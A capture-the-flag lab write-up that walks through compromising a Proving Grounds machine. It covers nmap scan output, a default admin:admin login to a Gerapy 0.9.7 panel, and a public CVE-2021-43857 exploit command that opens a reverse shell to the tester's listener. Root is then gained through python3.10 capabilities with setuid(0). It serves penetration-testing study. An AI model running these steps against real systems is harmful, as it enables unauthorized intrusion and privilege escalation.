Running a port scan with `rustcan -a IPADDRESS -- -A -sC -sV > levram.nmap`

```
PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt syn-ack WSGIServer/0.2 CPython/3.10.6
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Fri, 10 Nov 2023 10:39:07 GMT
|     Server: WSGIServer/0.2 CPython/3.10.6
|     Content-Type: text/html
|     Content-Length: 9979
|     Vary: Origin
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta http-equiv="content-type" content="text/html; charset=utf-8">
|     <title>Page not found at /nice ports,/Trinity.txt.bak</title>
|     <meta name="robots" content="NONE,NOARCHIVE">
|     <style type="text/css">
|     html * { padding:0; margin:0; }
|     body * { padding:10px 20px; }
|     body * * { padding:0; }
|     body { font:small sans-serif; background:#eee; color:#000; }
|     body>div { border-bottom:1px solid #ddd; }
|     font-weight:normal; margin-bottom:.4em; }
|     span { font-size:60%; color:#666; font-weight:normal; }
|     table { border:none; border-collapse: collapse; width:100%; }
|     vertical-align:top; padding:2px 3px; }
|     width:12em; text-align:right; color:#6
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 10 Nov 2023 10:39:02 GMT
|     Server: WSGIServer/0.2 CPython/3.10.6
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept, Origin
|     Allow: GET, OPTIONS
|     Content-Length: 2530
|_    <!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=icon href=/favicon.ico><title>Gerapy</title><link href=/static/css/chunk-10b2edc2.79f68610.css rel=prefetch><link href=/static/css/chunk-12e7e66d.8f856d8c.css rel=prefetch><link href=/static/css/chunk-39423506.2eb0fec8.css rel=prefetch><link href=/static/css/chunk-3a6102b3.0fe5e5eb.css rel=prefetch><link href=/static/css/chunk-4a7237a2.19df386b.css rel=prefetch><link href=/static/css/chunk-531d1845.b0b0d9e4.css rel=prefetch><link href=/static/css/chunk-582dc9b0.d60b5161.css rel=prefetch><link href=/static/css/chun
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
| http-methods: 
|_  Supported Methods: GET OPTIONS
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
|_http-title: Gerapy
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.80%I=7%D=11/10%Time=654E0847%P=x86_64-alpine-linux-mus
SF:l%r(GetRequest,AAA,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2010\x20No
SF:v\x202023\x2010:39:02\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3
SF:\.10\.6\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nVary:\x20Acc
SF:ept,\x20Origin\r\nAllow:\x20GET,\x20OPTIONS\r\nContent-Length:\x202530\
SF:r\n\r\n<!DOCTYPE\x20html><html\x20lang=en><head><meta\x20charset=utf-8>
SF:<meta\x20http-equiv=X-UA-Compatible\x20content=\"IE=edge\"><meta\x20nam
SF:e=viewport\x20content=\"width=device-width,initial-scale=1\"><link\x20r
SF:el=icon\x20href=/favicon\.ico><title>Gerapy</title><link\x20href=/stati
SF:c/css/chunk-10b2edc2\.79f68610\.css\x20rel=prefetch><link\x20href=/stat
SF:ic/css/chunk-12e7e66d\.8f856d8c\.css\x20rel=prefetch><link\x20href=/sta
SF:tic/css/chunk-39423506\.2eb0fec8\.css\x20rel=prefetch><link\x20href=/st
SF:atic/css/chunk-3a6102b3\.0fe5e5eb\.css\x20rel=prefetch><link\x20href=/s
SF:tatic/css/chunk-4a7237a2\.19df386b\.css\x20rel=prefetch><link\x20href=/
SF:static/css/chunk-531d1845\.b0b0d9e4\.css\x20rel=prefetch><link\x20href=
SF:/static/css/chunk-582dc9b0\.d60b5161\.css\x20rel=prefetch><link\x20href
SF:=/static/css/chun")%r(FourOhFourRequest,279E,"HTTP/1\.1\x20404\x20Not\x
SF:20Found\r\nDate:\x20Fri,\x2010\x20Nov\x202023\x2010:39:07\x20GMT\r\nSer
SF:ver:\x20WSGIServer/0\.2\x20CPython/3\.10\.6\r\nContent-Type:\x20text/ht
SF:ml\r\nContent-Length:\x209979\r\nVary:\x20Origin\r\n\r\n<!DOCTYPE\x20ht
SF:ml>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20http-equiv=\"conte
SF:nt-type\"\x20content=\"text/html;\x20charset=utf-8\">\n\x20\x20<title>P
SF:age\x20not\x20found\x20at\x20/nice\x20ports,/Trinity\.txt\.bak</title>\
SF:n\x20\x20<meta\x20name=\"robots\"\x20content=\"NONE,NOARCHIVE\">\n\x20\
SF:x20<style\x20type=\"text/css\">\n\x20\x20\x20\x20html\x20\*\x20{\x20pad
SF:ding:0;\x20margin:0;\x20}\n\x20\x20\x20\x20body\x20\*\x20{\x20padding:1
SF:0px\x2020px;\x20}\n\x20\x20\x20\x20body\x20\*\x20\*\x20{\x20padding:0;\
SF:x20}\n\x20\x20\x20\x20body\x20{\x20font:small\x20sans-serif;\x20backgro
SF:und:#eee;\x20color:#000;\x20}\n\x20\x20\x20\x20body>div\x20{\x20border-
SF:bottom:1px\x20solid\x20#ddd;\x20}\n\x20\x20\x20\x20h1\x20{\x20font-weig
SF:ht:normal;\x20margin-bottom:\.4em;\x20}\n\x20\x20\x20\x20h1\x20span\x20
SF:{\x20font-size:60%;\x20color:#666;\x20font-weight:normal;\x20}\n\x20\x2
SF:0\x20\x20table\x20{\x20border:none;\x20border-collapse:\x20collapse;\x2
SF:0width:100%;\x20}\n\x20\x20\x20\x20td,\x20th\x20{\x20vertical-align:top
SF:;\x20padding:2px\x203px;\x20}\n\x20\x20\x20\x20th\x20{\x20width:12em;\x
SF:20text-align:right;\x20color:#6");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:40
Completed NSE at 10:40, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:40
Completed NSE at 10:40, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:40
Completed NSE at 10:40, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.00 seconds


```

On port 8000 shows a webpage running on `WSGIServer 0.2`.

![Pasted image 20231110184502](https://github.com/tehokopi/Proving-Grounds/assets/150654583/70aabb6d-8b3c-45f4-813c-dbf961a67d3d)


Trying some credentials such as admin:admin
![Pasted image 20231110184617](https://github.com/tehokopi/Proving-Grounds/assets/150654583/717537ff-3118-45fd-872b-b448acc0fa7b)

Brought us to the login page. At the bottom, we see a `Gerapy v.0.9.7`, which will be taken note of.
![Pasted image 20231110184653](https://github.com/tehokopi/Proving-Grounds/assets/150654583/34fd0d35-f931-45e2-9582-313afcf48be7)
Googling the Graphy v0.9.7, there's an exploit on both github and exploitdb.
https://github.com/LongWayHomie/CVE-2021-43857
https://www.exploit-db.com/exploits/50640

At first, running the exploit keeps giving an index out of range error.
![Pasted image 20231110205858](https://github.com/tehokopi/Proving-Grounds/assets/150654583/316132d3-cf39-45c1-85cf-e2f070ab7878)

Reading the README on github,
![Pasted image 20231110210029](https://github.com/tehokopi/Proving-Grounds/assets/150654583/b9d37ff1-c6cb-4982-a4ea-1b6d1d174270)

The exploit will fail if there are no projects, hence, create a random project called test.
![Pasted image 20231110210100](https://github.com/tehokopi/Proving-Grounds/assets/150654583/ad234033-9e98-47d4-b764-2acab5706f16)

Then run the exploit again
 `python3 CVE.py -t 192.168.196.24 -p 8000 -L 192.168.45.157 -P 443`


![Pasted image 20231110210117](https://github.com/tehokopi/Proving-Grounds/assets/150654583/cd2b828b-a2c8-49db-8731-ad09448a2f0e)

Then we get a shell on our listening port on 443.
![Pasted image 20231110210202](https://github.com/tehokopi/Proving-Grounds/assets/150654583/42223e6b-3993-44cc-8bf5-6e9b76a96cda)

# Privilege Escalation

Running Linpeas to enumerate
We see capabilities set on python3.10
![Pasted image 20231111012423](https://github.com/tehokopi/Proving-Grounds/assets/150654583/2c34d378-7ce2-4e05-858a-9ad96cd7fee4)

This can also be viewed with the command:
`/usr/sbin/getcap -r / 2>/dev/null`

Now, create a script with the following and transfer it to the target:
![Pasted image 20231111012610](https://github.com/tehokopi/Proving-Grounds/assets/150654583/ca9f3655-978d-4135-b52a-37e8fe776d61)
setting the  setuid to 0

Running the exploit with :
python3.10 exploit.py

And we achieve root
![Pasted image 20231111012657](https://github.com/tehokopi/Proving-Grounds/assets/150654583/9455064f-11d7-4106-b524-865cb7da8a9c)

